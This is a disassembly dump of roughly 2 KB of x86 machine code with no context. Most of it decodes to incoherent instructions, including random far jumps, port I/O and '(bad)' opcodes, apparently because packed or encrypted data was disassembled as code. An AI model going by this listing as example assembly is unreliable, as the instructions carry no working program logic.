  4100ee:	dec    esp
  4100ef:	call   0x3581:0x83e39145
  4100f6:	cmp    ebp,DWORD PTR [ecx+0x7aebf8b]
  4100fc:	les    ebp,FWORD PTR [eax-0x38]
  4100ff:	mov    ecx,0xd084222f
  410104:	xor    eax,0x47e641f8
  410109:	gs jg  0x410152
  41010c:	or     al,0xa9
  41010e:	or     edx,esp
  410110:	push   0x3872347b
  410115:	sub    DWORD PTR ds:0x137f5b99,edi
  41011b:	imul   ebp
  41011d:	pop    ebp
  41011e:	(bad)  
  41011f:	jmp    0x735f:0x53e48ddc
  410126:	mov    dh,0x1
  410128:	js     0x41010f
  41012a:	mov    eax,ds:0x142d4b79
  41012f:	cld    
  410130:	out    0x9,eax
  410132:	out    dx,eax
  410133:	loope  0x4100f7
  410135:	adc    al,0x4a
  410137:	das    
  410138:	push   cs
  410139:	pop    eax
  41013a:	(bad)
  41013f:	xchg   ebp,eax
  410140:	ja     0x410197
  410142:	ins    BYTE PTR es:[edi],dx
  410143:	popa   
  410144:	adc    dh,BYTE PTR [edx-0x869f1f1]
  41014a:	sbb    DWORD PTR [eax],esp
  41014c:	inc    esp
  41014d:	mov    dl,0xc5
  41014f:	dec    eax
  410150:	mov    cl,0x12
  410152:	call   0xeb07:0xc78f91a3
  410159:	push   cs
  41015a:	std    
  41015b:	retf   0x4191
  41015e:	mov    al,ds:0x4ea2c76a
  410163:	pop    es
  410164:	mov    ebp,0x7c0e800b
  410169:	or     DWORD PTR [edx+0x165dc108],0x87a4dc8d
  410173:	out    dx,eax
  410174:	push   ss
  410175:	test   DWORD PTR [eax-0x41e3ac58],edi
  41017b:	dec    esi
  41017c:	push   edx
  41017d:	es out 0xe3,eax
  410180:	nop
  410181:	sbb    eax,0xfe2c70ec
  410186:	lea    esp,[ecx]
  410188:	push   edi
  410189:	out    0xb7,eax
  41018b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41018c:	fcmove st,st(0)
  41018e:	cwde   
  41018f:	stc    
  410190:	push   ss
  410191:	fwait
  410192:	pusha  
  410193:	mov    ch,0xb2
  410195:	xor    eax,0x4b9e7c2b
  41019a:	aas    
  41019b:	(bad)  [edx]
  41019d:	pop    ds
  41019e:	mov    ebx,0x9efb93ac
  4101a3:	addr16 rcr dl,1
  4101a6:	lahf   
  4101a7:	pop    ebp
  4101a8:	ret    0xd2df
  4101ab:	xor    DWORD PTR [edi],ebx
  4101ad:	cld    
  4101ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101af:	jne    0x4101a3
  4101b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101b2:	mov    edx,0xa71b8271
  4101b7:	loope  0x410151
  4101b9:	sbb    DWORD PTR [edi-0x16471b27],0x48590586
  4101c3:	jne    0x4101a1
  4101c5:	out    dx,al
  4101c6:	mov    DWORD PTR [ecx-0x2b],ecx
  4101c9:	call   0xed6aacb9
  4101ce:	fucomip st,st(7)
  4101d0:	xchg   edi,eax
  4101d1:	shl    ah,1
  4101d3:	fnsave [ecx]
  4101d5:	sub    eax,0x8d9dbcb8
  4101da:	xchg   esi,eax
  4101db:	out    dx,al
  4101dc:	es mov ah,0xe0
  4101df:	sbb    al,0x38
  4101e1:	mov    ebx,0x57cd3f43
  4101e6:	(bad)  
  4101e7:	enter  0x92b5,0xed
  4101eb:	ss cli 
  4101ed:	popa   
  4101ee:	jno    0x4101bc
  4101f0:	cmp    bh,BYTE PTR [ecx+0x1f]
  4101f3:	add    al,0xb2
  4101f5:	out    dx,eax
  4101f6:	dec    ebx
  4101f7:	scas   al,BYTE PTR es:[edi]
  4101f8:	xchg   esp,eax
  4101f9:	cs pop edi
  4101fb:	sahf   
  4101fc:	adc    bl,BYTE PTR [edx-0x1e12af7e]
  410202:	mov    bh,0xd7
  410204:	sub    ebx,DWORD PTR [edi+0x14]
  410207:	cmp    cl,bh
  410209:	hlt    
  41020a:	add    eax,0xe91800f3
  41020f:	jb     0x41021f
  410211:	fadd   st(0),st
  410213:	addr16 imul ecx,edi,0xffffffc8
  410217:	cli    
  410218:	add    BYTE PTR [esi-0xd],ch
  41021b:	loopne 0x4101b5
  41021d:	ins    BYTE PTR es:[edi],dx
  41021e:	popf   
  41021f:	js     0x410224
  410221:	dec    ebp
  410222:	fisubr DWORD PTR [ecx-0x11]
  410225:	mov    esi,0x9b19ef66
  41022a:	pop    edi
  41022b:	push   edx
  41022c:	int    0xf2
  41022e:	sub    BYTE PTR ds:0xe5d1aa53,dl
  410234:	xchg   ebx,eax
  410235:	popa   
  410236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410237:	loop   0x410236
  410239:	outs   dx,DWORD PTR ds:[esi]
  41023a:	mov    ch,0x78
  41023c:	call   0xaf2d:0x1ab6573f
  410243:	and    al,0x6d
  410245:	stos   DWORD PTR es:[edi],eax
  410246:	xor    bh,bl
  410248:	dec    edi
  410249:	lods   al,BYTE PTR ds:[esi]
  41024a:	or     eax,0x9075d5c4
  41024f:	xlat   BYTE PTR ds:[ebx]
  410250:	mov    al,ds:0xb9bb2161
  410255:	push   edx
  410256:	mov    ecx,0x85d82009
  41025b:	iret   
  41025c:	jbe    0x41020c
  41025e:	das    
  41025f:	cld    
  410260:	rcl    bl,1
  410262:	xchg   ebx,eax
  410263:	push   edx
  410264:	test   BYTE PTR [edi],ch
  410266:	cs dec bx
  410269:	dec    edi
  41026a:	sbb    eax,0xfe7cff81
  41026f:	xchg   esi,eax
  410270:	iret   
  410271:	int3   
  410272:	mov    cs,WORD PTR [ebx-0x51]
  410275:	xor    bh,BYTE PTR [ebp+edi*2-0x27]
  410279:	jo     0x41029f
  41027b:	imul   edi,DWORD PTR [ebx-0x1],0xffffffe5
  41027f:	mov    ebx,0x2f6a52f
  410284:	ins    BYTE PTR es:[edi],dx
  410285:	xchg   edx,eax
  410286:	dec    edx
  410287:	cli    
  410288:	loop   0x410269
  41028a:	xor    dl,BYTE PTR [ecx+ebp*1-0x28]
  41028e:	add    esi,esi
  410290:	sub    eax,0x71a4650e
  410295:	mov    bl,0xf4
  410297:	or     al,0x14
  410299:	mul    BYTE PTR [edx+0x34df9c4]
  41029f:	rol    BYTE PTR [ebp+0x26],0x81
  4102a3:	pop    ds
  4102a4:	xor    dl,BYTE PTR [ebx]
  4102a6:	adc    bh,bl
  4102a8:	repz mov edx,0x1a0ca824
  4102ae:	fucomi st,st(1)
  4102b0:	into   
  4102b1:	and    DWORD PTR [ecx-0x69c846d6],eax
  4102b7:	scas   al,BYTE PTR es:[edi]
  4102b8:	adc    edx,DWORD PTR [ecx-0x70]
  4102bb:	fcmovnbe st,st(4)
  4102bd:	jnp    0x4102b9
  4102bf:	pop    esp
  4102c0:	or     esp,eax
  4102c2:	fstp   QWORD PTR [edi]
  4102c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102c5:	pop    ebx
  4102c6:	lock dec ebp
  4102c8:	gs jno 0x410289
  4102cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102cc:	aad    0x85
  4102ce:	loope  0x4102f5
  4102d0:	dec    esi
  4102d1:	adc    DWORD PTR [eax],esp
  4102d3:	and    dh,BYTE PTR [edx+0x17]
  4102d6:	push   edi
  4102d7:	cmp    ch,BYTE PTR [ecx+ebp*2+0x26a772d6]
  4102de:	cmp    DWORD PTR ds:0x22acc2c,esp
  4102e4:	inc    ecx
  4102e5:	pop    esi
  4102e6:	inc    edi
  4102e7:	fsub   DWORD PTR [ecx+ebp*8-0x5d]
  4102eb:	cmp    bl,ah
  4102ed:	pop    esp
  4102ee:	data16 lock adc al,0x6e
  4102f2:	shr    ah,cl
  4102f4:	or     dl,ah
  4102f6:	jg     0x4102ba
  4102f8:	pusha  
  4102f9:	(bad)
  4102fc:	fs jg  0x41030a
  4102ff:	adc    BYTE PTR [esi+0x58],bl
  410302:	mov    DWORD PTR [edx-0x40da41ea],ebp
  410308:	je     0x41028f
  41030a:	xchg   esp,eax
  41030b:	loop   0x410335
  41030d:	mov    edi,0x31f34047
  410312:	cmp    bh,BYTE PTR [ebx-0x59f86fed]
  410318:	mov    al,ds:0x7f26b143
  41031d:	pop    ecx
  41031e:	jo     0x41031d
  410320:	mov    ds:0xc4de8930,ax
  410326:	out    0xc0,al
  410328:	cs push cs
  41032a:	pop    eax
  41032b:	push   esi
  41032c:	(bad)  
  41032d:	mov    dl,0x72
  41032f:	push   esp
  410330:	js     0x41035a
  410332:	push   edi
  410333:	dec    ebp
  410334:	push   esp
  410335:	mov    al,0x21
  410337:	rcl    ebp,1
  410339:	test   al,0xc3
  41033b:	xlat   BYTE PTR ds:[ebx]
  41033c:	rcr    BYTE PTR [edx-0x6],cl
  41033f:	repnz out dx,al
  410341:	adc    BYTE PTR [edx+0x60],cl
  410344:	inc    ebx
  410345:	stos   DWORD PTR es:[edi],eax
  410346:	push   esp
  410347:	fcomip st,st(4)
  410349:	es mov edi,0x663f399e
  41034f:	mov    al,ds:0x7a031f63
  410354:	lds    edx,FWORD PTR [edi+0x70]
  410357:	mov    cl,0xb1
  410359:	jl     0x4102dc
  41035b:	adc    cl,al
  41035d:	pop    esp
  41035e:	sub    al,0xb9
  410360:	pop    es
  410361:	mov    cl,0x17
  410363:	rcl    BYTE PTR [edx+0x35],0x6e
  410367:	mov    ah,0xe8
  410369:	dec    edx
  41036a:	cmp    DWORD PTR ds:[edx-0x40],ebp
  41036e:	inc    ebx
  41036f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410370:	call   0x9d3acce5
  410375:	pop    ecx
  410376:	or     BYTE PTR [esi-0x7ca89e4],0x48
  41037d:	in     eax,dx
  41037e:	xchg   ecx,eax
  41037f:	pop    esp
  410380:	enter  0xc693,0xe0
  410384:	jmp    0xfc4b:0x37b35e74
  41038b:	or     al,0x9d
  41038d:	xchg   bl,dh
  41038f:	stos   BYTE PTR es:[edi],al
  410390:	or     bl,BYTE PTR ds:0x897ee9c8
  410396:	dec    ebp
  410397:	or     BYTE PTR ds:0x2082,al
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd05
  4103a6:	add    ecx,DWORD PTR ds:0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0xa7bc:0x5d0bbab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	mov    cl,0xb4
  4103dc:	mov    ch,0x39
  4103de:	mov    ss,WORD PTR [ebx-0x54]
  4103e1:	dec    edi
  4103e2:	ret    0x423
  4103e5:	dec    esp
  4103e6:	inc    ebx
  4103e7:	dec    ebx
  4103e8:	pop    esi
  4103e9:	and    BYTE PTR [edx+0x54],cl
  4103ec:	test   eax,0xe08978b0
  4103f1:	and    al,0x39
  4103f3:	js     0x4103f4
  4103f5:	or     bh,BYTE PTR [ecx+0x6a]
  4103f8:	sub    BYTE PTR [edx+0x15],ch
  4103fb:	mov    edi,0xfce72eed
  410400:	mov    ah,0x88
  410402:	loope  0x4103f0
  410404:	sbb    ah,BYTE PTR [esi+edx*8+0x5c2c9a2]
  41040b:	js     0x410420
  41040d:	inc    ecx
  41040e:	scas   eax,DWORD PTR es:[edi]
  41040f:	sub    al,0xc5
  410411:	jae    0x4103c1
  410413:	jg     0x4103aa
  410415:	jo     0x4103a9
  410417:	imul   eax,ebp,0x5300f9f9
  41041d:	lock fdiv DWORD PTR [eax+0x6fe37bf6]
  410424:	nop
  410425:	xor    eax,0x10283ee4
  41042a:	hlt    
  41042b:	and    al,0xa2
  41042d:	(bad)  
  41042e:	in     eax,0xd3
  410430:	ja     0x410498
  410432:	pop    edi
  410433:	mov    ds:0xcc9adda3,eax
  410438:	out    dx,eax
  410439:	mov    edi,DWORD PTR [ebp+0x0]
  41043c:	cmp    eax,DWORD PTR [ecx-0x1a]
  41043f:	pop    eax
  410440:	sub    dh,BYTE PTR [ecx+0x7d]
  410443:	aam    0x33
  410445:	xor    eax,0x534b13cd
  41044a:	daa    
  41044b:	hlt    
  41044c:	adc    BYTE PTR [ebx+0x94e303e],bl
  410452:	out    dx,eax
  410453:	addr16 in al,0x1b
  410456:	jne    0x4104ba
  410458:	test   DWORD PTR [esi+0x4008dda8],0xd48f3b8c
  410462:	xchg   bl,bh
  410464:	pusha  
  410465:	mov    ecx,0x427812b9
  41046a:	(bad)  
  41046c:	cdq    
  41046d:	addr16 mov ch,0xd9
  410470:	xchg   esp,eax
  410471:	jmp    0x36d9:0xec7b05c3
  410478:	inc    ebx
  410479:	sbb    eax,0x2d202381
  41047e:	push   ecx
  41047f:	push   ss
  410480:	jns    0x41044f
  410482:	outs   dx,DWORD PTR ds:[esi]
  410483:	mov    edi,0x3b966c87
  410488:	push   ecx
  410489:	pop    ds
  41048a:	inc    esp
  41048b:	into   
  41048c:	sbb    BYTE PTR es:[edi],al
  41048f:	pop    esi
  410490:	xchg   edi,eax
  410491:	adc    eax,0x8ed00ddf
  410496:	push   ebx
  410497:	pop    esp
  410498:	popa   
  410499:	xchg   ecx,eax
  41049a:	lock data16 out 0x70,al
  41049e:	xor    cl,BYTE PTR [ecx+eax*2]
  4104a1:	test   DWORD PTR [ebp-0x467a81c0],0x7f17149d
  4104ab:	xchg   ebx,eax
  4104ac:	inc    esp
  4104ad:	aas    
  4104ae:	push   ds
  4104af:	inc    eax
  4104b0:	test   al,0x37
  4104b2:	retf   0xd6ed
  4104b5:	push   eax
  4104b6:	repnz push edi
  4104b8:	inc    ecx
  4104b9:	(bad)  
  4104bb:	mov    esi,0xcbd06cc5
  4104c0:	fld    QWORD PTR [ebx+0x42ceab1d]
  4104c6:	aaa    
  4104c7:	adc    DWORD PTR ds:0xd344ddad,eax
  4104cd:	inc    edx
  4104ce:	mov    dh,0xfd
  4104d0:	leave  
  4104d1:	mov    ebp,0xf1276b33
  4104d6:	jmp    0x4104c7
  4104d8:	mov    esi,0x8e603beb
  4104dd:	outs   dx,BYTE PTR ds:[esi]
  4104de:	or     BYTE PTR [esi+ebp*1-0x60cba0b2],ah
  4104e5:	lock jle 0x41051a
  4104e8:	pop    ds
  4104e9:	push   eax
  4104ea:	push   edx
  4104eb:	mov    ebx,DWORD PTR [edi+eiz*2+0x5d14c5e1]
  4104f2:	xor    BYTE PTR [eax-0x20ecd5ca],dl
  4104f8:	inc    ebx
  4104f9:	rol    BYTE PTR [edi],cl
  4104fb:	mov    ds:0x83fdd28e,al
  410500:	ror    dl,0xe5
  410503:	sbb    BYTE PTR [eax+0x1bfd1414],0x87
  41050a:	or     bl,bl
  41050c:	ins    DWORD PTR es:[edi],dx
  41050d:	rol    esp,0xc6
  410510:	sbb    BYTE PTR [ebx],ch
  410512:	mov    al,ds:0x569a880f
  410517:	mov    esi,0x24590287
  41051c:	ret    
  41051d:	icebp  
  41051e:	repz push ebp
  410520:	add    ah,BYTE PTR [esi+0x4]
  410523:	not    BYTE PTR [ebx]
  410525:	or     ecx,eax
  410527:	xor    cl,dl
  410529:	add    DWORD PTR [edi-0x6],eax
  41052c:	and    al,0x79
  41052e:	inc    ecx
  41052f:	mov    BYTE PTR [ecx-0x5d3c7b46],bh
  410535:	and    al,0xf6
  410537:	arpl   WORD PTR [ebx+eiz*4-0x52],di
  41053b:	pop    ebp
  41053c:	mov    esi,0x8c14a833
  410541:	sub    DWORD PTR [ebx],edi
  410543:	sub    eax,ecx
  410545:	jnp    0x41058e
  410547:	dec    ebp
  410548:	(bad)  
  410549:	ret    
  41054a:	pop    edi
  41054b:	xor    edx,DWORD PTR [ecx+0x56]
  41054e:	push   DWORD PTR ds:0x88c69577
  410554:	jnp    0x4104d8
  410556:	lods   al,BYTE PTR ds:[esi]
  410557:	xor    DWORD PTR [ebx],ecx
  410559:	jmp    0x4105d9
  41055b:	or     BYTE PTR [esi+ebx*2+0x5983a875],dh
  410562:	mov    esi,0xe44f9451
  410567:	sbb    eax,0x67c0208f
  41056c:	inc    edx
  41056d:	call   0xf15a8f5f
  410572:	dec    esp
  410573:	sub    DWORD PTR [esi+ebx*1-0x56],0x2d89a44a
  41057b:	push   ebx
  41057c:	push   ds
  41057d:	fnstenv [ecx-0x10dba7a8]
  410583:	push   esp
  410584:	adc    BYTE PTR [esp+eiz*2],dl
  410587:	push   eax
  410588:	bound  edi,QWORD PTR [esi-0xe]
  41058b:	push   eax
  41058c:	ror    DWORD PTR [eax],0xa3
  41058f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410590:	push   edx
  410591:	fwait
  410592:	cmp    ecx,esp
  410594:	ret    
  410595:	sub    al,0x78
  410597:	fisubr WORD PTR [edi+0x68]
  41059a:	fadd   QWORD PTR [ecx-0x7f]
  41059d:	or     eax,0x3639cc9c
  4105a2:	adc    edx,DWORD PTR [esi-0x17]
  4105a5:	sbb    esp,0xffffffe6
  4105a8:	jge    0x410621
  4105aa:	push   cs
  4105ab:	mov    ebp,0x8d6b941
  4105b0:	cmp    DWORD PTR [eax],edi
  4105b2:	or     edi,DWORD PTR [ecx]
  4105b4:	in     eax,dx
  4105b5:	jno    0x41058a
  4105b7:	sub    BYTE PTR [ecx+0x18],bl
  4105ba:	jl     0x410594
  4105bc:	hlt    
  4105bd:	xchg   esi,eax
  4105be:	nop
  4105bf:	js     0x4105a1
  4105c1:	adc    eax,0x4031bfcc
  4105c6:	ja     0x410559
  4105c8:	out    dx,al
  4105c9:	xchg   esp,eax
  4105ca:	loope  0x410582
  4105cc:	test   BYTE PTR [ecx+0x75],0x11
  4105d0:	xchg   ebp,eax
  4105d1:	(bad)
  4105d4:	or     DWORD PTR [edi],0x76
  4105d7:	dec    edi
  4105d8:	ret    
  4105d9:	push   esp
  4105da:	jbe    0x4105f7
  4105dc:	aad    0xe7
  4105de:	cmp    al,0x3b
  4105e0:	jno    0x4105ce
  4105e2:	aam    0xb0
  4105e4:	out    0x7b,eax
  4105e6:	pop    ss
  4105e7:	aas    
  4105e8:	repz push DWORD PTR [edi+esi*1]
  4105ec:	and    eax,0x8e9e5e22
  4105f1:	inc    edi
  4105f2:	in     eax,dx
  4105f3:	mul    dl
  4105f5:	popf   
  4105f6:	inc    esi
  4105f7:	jmp    0x2902:0x213bcaab
  4105fe:	nop
  4105ff:	mov    ebx,0xec137f52
  410604:	xchg   BYTE PTR [eax-0x33],ch
  410607:	push   ecx
  410608:	mov    ah,0xce
  41060a:	es inc ebx
  41060c:	xchg   BYTE PTR [ecx-0x799bf1a9],dh
  410612:	imul   ecx,DWORD PTR [esi],0xc3e9b817
  410618:	imul   esi,DWORD PTR [eax-0x7],0xffffffe3
  41061c:	push   eax
  41061d:	loope  0x41067e
  41061f:	and    al,0x6c
  410621:	add    ebx,DWORD PTR [eax]
  410623:	enter  0xd7f0,0x2b
  410627:	jb     0x4105b9
  410629:	gs dec edx
  41062b:	cmp    DWORD PTR [esi],ecx
  41062d:	fistp  WORD PTR [ebp+0x5d]
  410630:	nop
  410631:	xchg   edx,eax
  410632:	cdq    
  410633:	mov    eax,0x20da4c26
  410638:	or     al,0xc1
  41063a:	js     0x410603
  41063c:	rcr    dh,0x7a
  41063f:	mov    ch,0xb5
  410641:	(bad)
  410645:	imul   eax,DWORD PTR [ebx+ebp*4],0x9bc44fa5
  41064c:	aad    0x4d
  41064e:	mov    ds:0x2d586db3,eax
  410653:	inc    ebx
  410654:	xor    BYTE PTR [edx+ebx*8],0x32
  410658:	fiadd  DWORD PTR [edi-0x5e212078]
  41065e:	test   eax,0xbcd20d06
  410663:	in     al,0x27
  410665:	pop    ss
  410666:	(bad)  
  410667:	aad    0xd9
  410669:	stos   DWORD PTR es:[edi],eax
  41066a:	xor    esi,DWORD PTR [ecx]
  41066c:	dec    esp
  41066d:	sbb    eax,0xa8f414d6
  410672:	sub    al,0x21
  410674:	xchg   esp,eax
  410675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410676:	push   ebp
  410677:	or     edi,DWORD PTR [esi-0x36742c68]
  41067d:	push   ds
  41067e:	mov    ebx,0xf98c017f
  410683:	push   0x3af883c3
  410688:	sti    
  410689:	cmp    dh,BYTE PTR [ecx+0x24]
  41068c:	fadd   QWORD PTR [edx]
  41068e:	adc    eax,0x4f39053a
  410693:	hlt    
  410694:	xor    al,0x3e
  410696:	push   es
  410697:	xor    eax,0x69c939ce
  41069c:	and    al,BYTE PTR [ebx+edi*1+0x6b]
  4106a0:	and    dh,BYTE PTR [ebx-0x3d]
  4106a3:	mov    ebp,esp
  4106a5:	mov    cl,0x5f
  4106a7:	push   0xffffffa6
  4106a9:	mov    ecx,edx
  4106ab:	mov    cl,0x6f
  4106ad:	jg     0x4106fd
  4106af:	mov    ss,WORD PTR [eax+0x2738e4e6]
  4106b5:	inc    edx
  4106b6:	ret    0x9580
  4106b9:	add    DWORD PTR [edx+0x1b],edx
  4106bc:	cmp    eax,0x438828
  4106c1:	sub    eax,0x92cf2823
  4106c6:	int    0x44
  4106c8:	mov    ds,WORD PTR [ecx+esi*8+0x19489159]
  4106cf:	std    
  4106d0:	pusha  
  4106d1:	xchg   BYTE PTR [ebx],ah
  4106d3:	sbb    ecx,ebx
  4106d5:	push   cs
  4106d6:	jnp    0x4106ab
  4106d8:	stos   BYTE PTR es:[edi],al
  4106d9:	jb     0x4106b4
  4106db:	out    0x8,eax
  4106dd:	imul   BYTE PTR [ebx+0x6c]
  4106e0:	retf   
  4106e1:	xor    al,0xe
  4106e3:	(bad)  
  4106e4:	dec    ebp
  4106e5:	mov    al,ds:0x2aa2a728
  4106ea:	imul   ebp,ebp,0x3172016
  4106f0:	xchg   ecx,eax
  4106f1:	adc    bl,BYTE PTR [ebx+0xfaafb93]
  4106f7:	stos   BYTE PTR es:[edi],al
  4106f8:	popa   
  4106f9:	cdq    
  4106fa:	mov    eax,0x506530cc
  4106ff:	fs add eax,0xba67f3ff
  410705:	test   BYTE PTR [edi+0x3ce14ea9],dl
  41070b:	mov    DWORD PTR [edi],ebp
  41070d:	popa   
  41070e:	lods   al,BYTE PTR ds:[esi]
  41070f:	scas   al,BYTE PTR es:[edi]
  410710:	pop    ebp
  410711:	jno    0x410770
  410713:	cmc    
  410714:	mov    al,dl
  410716:	xor    eax,ebx
  410718:	es inc eax
  41071a:	and    ebp,DWORD PTR [ebp+0x3c]
  41071d:	cmc    
  41071e:	sub    al,0x6c
  410720:	jmp    0x1e78:0xf5f01f5b
  410727:	pop    ds
  410728:	arpl   WORD PTR ds:0x708114a7,bp
  41072e:	pop    ebp
  41072f:	jp     0x410747
  410731:	adc    DWORD PTR [ebx+0x308a810c],ebx
  410737:	out    0x87,eax
  410739:	outs   dx,BYTE PTR ds:[esi]
  41073a:	test   cl,ah
  41073c:	jecxz  0x4106ca
  41073e:	je     0x410779
  410740:	popa   
  410741:	or     BYTE PTR [edx-0x78],ch
  410744:	bound  eax,QWORD PTR [eax-0x6f]
  410747:	pushw  es
  410749:	call   0xfe91:0xfe336d60
  410750:	fimul  DWORD PTR [edx]
  410752:	inc    eax
  410753:	aam    0x88
  410755:	sub    al,0xda
  410757:	xor    BYTE PTR [ebx+0x95aa621],ch
  41075d:	ds stos BYTE PTR es:[edi],al
  41075f:	fisubr WORD PTR [eax-0x2f8d15c6]
  410765:	push   es
  410766:	cmp    BYTE PTR [ebx],al
  410768:	ins    DWORD PTR es:[edi],dx
  410769:	mov    bl,0xa3
  41076b:	fsub   DWORD PTR [eax-0x1a97c2db]
  410771:	(bad)  
  410773:	cmp    al,0xd1
  410775:	(bad)  
  410776:	frstpm(287 only) 
  410778:	(bad)  
  410779:	stc    
  41077a:	mov    BYTE PTR [eax+0x31],cl
  41077d:	scas   eax,DWORD PTR es:[edi]
  41077e:	ret    0x92f1
  410781:	aam    0xea
  410783:	into   
  410784:	inc    ebx
  410785:	in     eax,dx
  410786:	cmp    DWORD PTR [ebx-0x267ef78b],ecx
  41078c:	es das 
  41078e:	add    BYTE PTR [eax],al
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	add    esi,ebx
  4107aa:	sbb    DWORD PTR [ebp-0x75],ebp
  4107ad:	inc    esi
  4107ae:	jo     0x410820
  4107b0:	mov    ds:0x3770707d,eax
  4107b5:	mov    dl,BYTE PTR [esp+ebx*1]
  4107b8:	nop
  4107b9:	cmovne ecx,DWORD PTR [eax-0x31]
  4107bd:	pop    ebx
  4107be:	mov    DWORD PTR [esi+0x1d2f5179],eax
  4107c4:	jmp    0x1dc6c353
  4107c9:	je     0x41075c
  4107cb:	xchg   ebx,eax
  4107cc:	add    al,0x5d
  4107ce:	or     BYTE PTR [edx],bl
  4107d0:	lahf   
  4107d1:	arpl   WORD PTR [eax+esi*1+0x4094124c],si
  4107d8:	out    dx,al
  4107d9:	and    edi,DWORD PTR [eax+0x232b6b0a]
  4107df:	cli    
  4107e0:	sbb    al,0xb0
  4107e2:	push   es
  4107e3:	push   0x19
  4107e5:	enter  0x7623,0xe
  4107e9:	xchg   esp,eax
  4107ea:	ins    BYTE PTR es:[edi],dx
  4107eb:	dec    ecx
  4107ec:	and    bl,ch
  4107ee:	rol    DWORD PTR [ecx-0x5],1
  4107f1:	mov    dh,0xcb
  4107f3:	shl    DWORD PTR [ebx-0x14],cl
  4107f6:	adc    al,0x68
  4107f8:	pop    ds
  4107f9:	sbb    esi,DWORD PTR [eax+0x44]
  4107fc:	jg     0x4107ab
  4107fe:	xor    esi,edx
  410800:	sbb    edx,ebx
  410802:	cli    
  410803:	aam    0xb5
  410805:	popa   
  410806:	push   eax
  410807:	frstor [ebp+0x71]
  41080a:	sti    
  41080b:	mov    WORD PTR [ecx-0x58ad9b5f],fs
  410811:	inc    edx
  410812:	jge    0x41084f
  410814:	mov    ecx,0x65333c24
  410819:	pop    ebx
  41081a:	xor    BYTE PTR [edi],0x57
  41081d:	pusha  
  41081e:	mov    ch,0xfe
  410820:	push   ecx
  410821:	(bad)  
  410823:	sub    DWORD PTR [ebp+0x36220ee8],0xffffff8e
  41082a:	xchg   edx,eax
  41082b:	inc    eax
  41082c:	cmp    ebx,edx
  41082e:	scas   al,BYTE PTR es:[edi]
  41082f:	dec    edi
  410830:	cmp    eax,0xcbb7f012
  410835:	lock dec eax
  410837:	(bad)  
  410838:	iret   
  410839:	int3   
  41083a:	(bad)  
  41083b:	and    DWORD PTR [ebp-0x20b187a0],eax
  410841:	into   
  410842:	in     eax,0x6
  410844:	(bad)  
  410845:	cdq    
  410846:	int3   
  410847:	adc    eax,0xc2a17bd3
  41084c:	(bad)  [edi-0x4f838332]
  410852:	imul   esi,DWORD PTR [ecx-0x7f],0xffffffc1
  410856:	sbb    DWORD PTR [edx-0x5b],edi
  410859:	pop    ecx
  41085a:	mov    ds:0xc85a8091,eax
  41085f:	stos   BYTE PTR es:[edi],al
  410860:	xchg   edx,eax
  410861:	and    al,0xc3
  410863:	daa    
  410864:	jb     0x410811
  410866:	mov    eax,0x521b5fcd
  41086b:	and    dh,cl
  41086d:	xor    bh,BYTE PTR ds:0x860bd946
  410873:	jmp    0x9f1fad23
  410878:	out    0xb4,eax
  41087a:	lds    eax,FWORD PTR [eax-0x2d48242e]
  410880:	ret    0xfb8b
  410883:	retf   
  410884:	cmp    BYTE PTR [edx+0x59837bfa],ah
  41088a:	cmp    al,0xa5
  41088c:	mov    bh,ch
  41088e:	push   0xffffffad
  410890:	aam    0x5
  410892:	mov    esp,0xa27ccb87
  410897:	mov    al,0xe2
  410899:	call   0x9897:0x3c5fceca
  4108a0:	xchg   BYTE PTR [esi+0x1a7fdd0e],dl
  4108a6:	rcl    BYTE PTR [edi-0x7b958767],cl
  4108ac:	inc    ebp
  4108ad:	out    0x8c,al
  4108af:	stos   BYTE PTR es:[edi],al
  4108b0:	fs sub al,ch
  4108b3:	fs xor ecx,edi
  4108b6:	(bad)  
  4108b7:	in     eax,dx
  4108b8:	jns    0x410873
  4108ba:	iret   
  4108bb:	jl     0x4108d1
  4108bd:	(bad)  
  4108be:	jbe    0x41091a
  4108c0:	xchg   ebx,eax
  4108c1:	out    dx,eax
  4108c2:	add    BYTE PTR [edi+0x4e],bl
  4108c5:	cmp    ch,dl
  4108c7:	xchg   BYTE PTR [ebx],dh
  4108c9:	mov    al,0xdd
  4108cb:	push   esp
  4108cc:	xchg   esi,eax
  4108cd:	or     ch,BYTE PTR [eax+0x5b]
  4108d0:	popf   
  4108d1:	jbe    0x4108df
  4108d3:	inc    ecx
  4108d4:	push   esi
  4108d5:	push   ebx
  4108d6:	sub    cl,BYTE PTR [ebx]
  4108d8:	out    0xc6,al
  4108da:	out    dx,eax
  4108db:	mov    edi,0xe8c731f5
  4108e0:	push   esi
  4108e1:	xchg   BYTE PTR [ecx+0x7e],dh
  4108e4:	std    
  4108e5:	pop    ebp
  4108e6:	adc    DWORD PTR [eax-0x13],esi
  4108e9:	mov    ebp,gs
  4108eb:	inc    esp
  4108ec:	outs   dx,BYTE PTR ds:[esi]
  4108ed:	gs sub eax,0xce0ef611
  4108f3:	imul   esi,DWORD PTR [eax+ebx*4+0x55ca722f],0xffffffad
  4108fb:	or     BYTE PTR [ebx],bl
  4108fd:	clc    
